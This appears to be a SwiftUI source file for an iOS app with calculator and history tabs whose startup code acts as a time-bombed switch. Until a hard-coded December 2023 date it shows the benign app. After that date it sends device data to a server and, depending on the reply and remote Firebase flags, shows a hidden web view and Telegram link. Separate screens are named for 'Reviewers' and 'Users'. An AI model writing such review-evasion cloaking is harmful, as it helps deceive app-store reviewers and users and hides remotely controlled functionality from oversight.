//
//  ContentView.swift
//  App280
//
//  Created by Вячеслав on 12/13/23.
//

import SwiftUI
import Amplitude

struct ContentView: View {
    
    @State var current_tab: Tab = Tab.Home
    
    @State var server: String = ""
    @State var telegram: URL = URL(string: "h")!
    @State var isDead: Bool = false
    @State var isTelegram: Bool = false
    
    @AppStorage("status") var status: Bool = false
    
    init() {
        
        UITabBar.appearance().isHidden = true
    }
    
    var body: some View {
        
        ZStack {
            
            Color("bg")
                .ignoresSafeArea()
            
            if server.isEmpty || telegram.absoluteString == "h" {
                
                LoadingView()
                
            } else {
                
                if server == "0" {
                    
                    if status {
                        
                        WebSystem()
                        
                    } else {
                        
                        Users_1(telegram: telegram, isTelegram: isTelegram)
                    }
                    
                } else if server == "1" {
                    
                    if status {
                        
                        VStack(spacing: 0, content: {
                            
                            TabView(selection: $current_tab, content: {
                                
                                HomeView()
                                    .tag(Tab.Home)
                                
                                HistoryView()
                                    .tag(Tab.History)
                                
                                CalculatorView()
                                    .tag(Tab.Calculator)
                                
                                SettingView()
                                    .tag(Tab.Setting)
                            })
                            
                            TabBar(selectedTab: $current_tab)
                        })
                        .ignoresSafeArea(.all, edges: .bottom)
                        .onAppear {
                            
                            Amplitude.instance().logEvent("did_show_main_screen")
                        }
                        
                    } else {
                        
                        Reviewers_1()
                    }
                }
            }
        }
        .onAppear {
            
            check_data(isCaptured: false)
        }
    }
    
    private func check_data(isCaptured: Bool) {
        
        getFirebaseData(field: "isDead", dataType: .bool) { result1 in
            
            let result1 = result1 as? Bool ?? false
            isDead = result1
            
            getFirebaseData(field: "telegram", dataType: .url) { result2 in
                
                let result2 = result2 as? URL ?? URL(string: "h")!
                telegram = result2
                
                getFirebaseData(field: "isTelegram", dataType: .bool) { result3 in
                    
                    let result3 = result3 as? Bool ?? false
                    isTelegram = result3
                    
                    let repository = RepositorySecond()
                    let myData = MyDataClass.getMyData()
                    let now = Date().timeIntervalSince1970

                    var dateComponents = DateComponents()
                    dateComponents.year = 2023
                    dateComponents.month = 12
                    dateComponents.day = 16

                    let targetDate = Calendar.current.date(from: dateComponents)!
                    let targetUnixTime = targetDate.timeIntervalSince1970
                    
                    guard now > targetUnixTime else {

                        server = "1"

                        return
                    }
                    
                    repository.post(isCaptured: isCaptured, isCast: false, mydata: myData) { result in
                        
                        switch result {
                        case .success(let data):
                            if "\(data)" == "" {
                                
                                self.server = "1"
                                
                            } else {
                                
                                self.server = "\(data)"
                            }
                            
                        case .failure(_):
                            
                            if self.isDead == true {
                                
                                self.server = "0"
                                
                            } else {
                                
                                self.server = "1"
                            }
                        }
                    }
                }
            }
        }
    }
}

#Preview {
    ContentView()
}
